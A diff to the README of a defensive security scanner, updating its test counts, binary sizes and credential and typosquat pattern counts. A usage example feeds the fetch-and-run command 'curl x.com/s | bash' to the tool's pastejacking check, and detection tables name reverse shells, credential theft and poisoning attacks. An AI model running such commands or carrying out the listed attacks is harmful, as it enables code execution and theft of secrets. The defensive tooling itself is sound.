@@ -24,13 +24,13 @@ Evasion resistance:
   DGA / random domains:         BLOCKED  (x7k2p9qzr4mw.com → detected)
 
 Reliability:
-  Structured tests:             1173 passing, 0 failing (9 unit suites +
+  Structured tests:             1187 passing, 0 failing (9 unit suites +
                                  corpus + CLI integration — see: make test)
   Fuzz iterations:              600,000 (6 harnesses × 100K, 0 crashes)
   ASan + UBSan:                 0 errors
   Compiler warnings:            0 (-Wall -Wextra -Wpedantic -Wshadow -Wconversion)
 
-Binary size:   ~140 KB (dynamic, stripped), ~1.0 MB (static-pie, stripped)
+Binary size:   ~464 KB (dynamic, stripped), ~1.5 MB (static-pie, stripped)
 Dependencies:  libc + libm only
 Platform:      Linux, macOS (partial)
 ```
@@ -44,9 +44,9 @@ Platform:      Linux, macOS (partial)
 | **Prompt injection** | hlse_text.c | Invisible instruction carriers aimed at AI agents — Unicode Tags block (U+E0000–U+E007F) payloads outside legitimate emoji tag sequences, and long zero-width runs used as a hidden data channel. Applied by both `text` and `scan <dir>`, so poisoned documents, agent skill files and MCP/tool descriptions in a repo are covered. Structural detection only: an injection written in ordinary visible prose is out of scope |
 | **Ransomware** | hlse_protect.c | Entropy spike, ransom notes, extension mutation, shadow deletion |
 | **MBR/GPT** | hlse_protect.c | Boot signature, bootkit strings, obfuscation detection |
-| **Credential leak** | hlse_secrets.c | 55 token patterns — AWS (incl. STS), GitHub, GitLab, Google + Google OAuth (GOCSPX-), npm, OpenAI/Anthropic, Groq/Perplexity/xAI, Stripe, Shopify, HuggingFace, PyPI, Postman, Square, Doppler, Grafana, Linear, New Relic, Databricks, PlanetScale, HashiCorp Vault (service/batch/recovery), Netlify, Render, Fly.io, CircleCI, Contentful, SendGrid, Vercel, Slack/Discord webhooks, SSH keys, .env passwords; plus 7 structural checks — GCP service-account JSON, Azure SAS, Azure storage AccountKey, AWS credentials-file secret, JWT bearer tokens (with algorithm named, and unsigned `alg:none` tokens flagged as forgeable), Telegram bot tokens, and DB/service connection-string embedded credentials (postgres/mysql/mongodb+srv/redis/amqp/…). Excludes doc/example/placeholder keys to cut false positives. Clipboard crypto-swap for 16 chains (BTC/ETH/XMR/SOL/USDT-TRC20/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
+| **Credential leak** | hlse_secrets.c | 61 token patterns — AWS (incl. STS), GitHub, GitLab, Google + Google OAuth (GOCSPX-), npm, OpenAI/Anthropic, Groq/Perplexity/xAI, Stripe, Shopify, HuggingFace, PyPI, Postman, Square, Doppler, Grafana, Linear, New Relic, Databricks, PlanetScale, HashiCorp Vault (service/batch/recovery), Netlify, Render, Fly.io, CircleCI, Contentful, SendGrid, Vercel, Slack/Discord webhooks, SSH keys, .env passwords; plus 7 structural checks — GCP service-account JSON, Azure SAS, Azure storage AccountKey, AWS credentials-file secret, JWT bearer tokens (with algorithm named, and unsigned `alg:none` tokens flagged as forgeable), Telegram bot tokens, and DB/service connection-string embedded credentials (postgres/mysql/mongodb+srv/redis/amqp/…). Excludes doc/example/placeholder keys to cut false positives. Clipboard crypto-swap for 16 chains (BTC/ETH/XMR/SOL/USDT-TRC20/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
 | **Email forensics** | hlse_secrets.c | SPF/DKIM fail, Reply-To mismatch, display-name spoofing |
-| **Supply chain** | hlse_supply.c | Package typosquat (pip/npm/cargo/go/gem — 280 packages), pastejacking (Unix curl\|sh + reverse shells + Windows ClickFix LOLBins + macOS osascript), network safety (N1 ARP poisoning, N2 default-route/routing injection, N3 DNS resolver, N4 hosts-file pharming — ~50 banking/exchange/wallet domains) |
+| **Supply chain** | hlse_supply.c | Package typosquat (pip/npm/cargo/go/gem — 369 packages), pastejacking (Unix curl\|sh + reverse shells + Windows ClickFix LOLBins + macOS osascript), network safety (N1 ARP poisoning, N2 default-route/routing injection, N3 DNS resolver, N4 hosts-file pharming — ~50 banking/exchange/wallet domains) |
 | **File masquerade** | hlse_file.c | Double extensions, magic byte mismatch (PE/ELF/Mach-O/PDF/ZIP/CAB/WASM/shebang-script/HTML-smuggling), suspicious filenames, BIDI/RLO override, update-dropper lures |
 | **System audit** | hlse_audit.c | SSH hardening, file permissions, DNS, cron persistence (user crontabs + /etc/cron.{d,hourly,daily,weekly,monthly} + /etc/crontab), insecure $PATH, shell-rc backdoors (function/alias hijack) + system-wide /etc/profile.d, sudoers NOPASSWD |
 
@@ -58,7 +58,7 @@ make test                               # run all test suites
 ./hlse_core                             # interactive demo
 ./hlse_core "https://g00gle.com"        # scan a URL
 ./hlse_core text "URGENT: wire $5000"   # scan text
-./hlse_core package reqeusts pip        # check for typosquat (280 packages)
+./hlse_core package reqeusts pip        # check for typosquat (369 packages)
 ./hlse_core paste "curl x.com/s | bash" # pastejacking check
 ./hlse_core scan /path/to/project        # recursive secret + file scan (CI/CD)
 ./hlse_core protect /home/user/docs     # ransomware scan
@@ -236,13 +236,13 @@ response. The JSON parser/escaper/rate limiter are unit-tested in
 | Unit (text) | 18 | Individual text signal accuracy (incl. BEC patterns, IRS FP regression, smishing) |
 | Property invariants | 64 | Monotonicity, bounds, determinism, case, evasion (P1–P13) |
 | Protection | 22 | Ransomware (incl. R6 intermittent-encryption), network drive, SMB, MBR/GPT, ESP |
-| Secrets | 66 | Credentials (55 token patterns + GCP SA JSON + Azure SAS + Azure AccountKey + AWS creds-file + JWT + Telegram + URI creds), email headers (E1-E6 incl. E1 brand-domain ownership guard + E5 Received-chain anomaly), crypto addresses (BTC/ETH/SOL/XMR/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
+| Secrets | 66 | Credentials (61 token patterns + GCP SA JSON + Azure SAS + Azure AccountKey + AWS creds-file + JWT + Telegram + URI creds), email headers (E1-E6 incl. E1 brand-domain ownership guard + E5 Received-chain anomaly), crypto addresses (BTC/ETH/SOL/XMR/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
 | Supply chain | 39 | Package typosquat (pip/npm/cargo/go/gem), pastejacking (Unix + Windows ClickFix + macOS osascript + Python download-exec + P9 reverse shell), network |
 | File/Audit | 36 | File masquerade (PE/ELF/Mach-O/7ZIP/CAB/WASM/shebang-script/HTML-smuggling), system hardening (SSH/perms/DNS/cron incl. /etc/cron.*+/etc/crontab/PATH/shell-rc incl. PROMPT_COMMAND/function-override/alias-hijack+/etc/profile.d, sudoers NOPASSWD A7) + hardening index |
 | Util | 55 | Entropy, JSON escaping, Damerau-Levenshtein, benign-magic (31 formats: archives/images/media/fonts/certs/scientific) + safe system-file open (FIFO/symlink) |
 | Server | 15 | HTTP server JSON request parser/escaper + per-IP rate limiter |
 | OOD corpus | 29 | Out-of-distribution F1 (held-out phishing/scam) |
-| CLI integration | 790 | All 12 subcommands, JSON action band, exit codes, scan, ESP, symlink-escape, evasion, embedded-URL JSON, SARIF relative URIs, obfuscated-IP/@-authority URL guards, HTML-smuggling, secret-format coverage (JWT/AWS-creds/Telegram/URI-creds), no-arg exit=2 |
+| CLI integration | 804 | All 12 subcommands, JSON action band, exit codes, scan, ESP, symlink-escape, evasion, embedded-URL JSON, SARIF relative URIs, obfuscated-IP/@-authority URL guards, HTML-smuggling, secret-format coverage (JWT/AWS-creds/Telegram/URI-creds), no-arg exit=2 |
 | Fuzz | 6 × 100K | text / secrets / supply-chain / file / URL / server-JSON harnesses (random bytes, truncated UTF-8, keyword stuffing, typosquat mutation, bidi/control, Unicode mutation, percent-encoding, dangerous-scheme, malformed JSON) |
 
 ## Privacy
